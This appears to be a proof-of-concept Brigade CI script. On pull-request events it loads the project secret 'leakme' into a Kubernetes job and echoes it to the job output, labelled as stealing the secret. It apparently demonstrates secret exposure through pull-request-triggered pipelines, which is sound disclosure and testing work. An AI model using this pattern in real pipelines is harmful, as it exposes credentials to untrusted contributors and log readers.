const { events, Job } = require('brigadier')

events.on("pull_request", (brigadeEvent, project) => {
    var job = new Job("demojob", "alpine:3.4")
    job.env = {
        "leakme": project.secrets.leakme
    }
    job.tasks = [
        "echo I am in your k8s stealing your secret: $leakme",
    ]

    job.run()
})
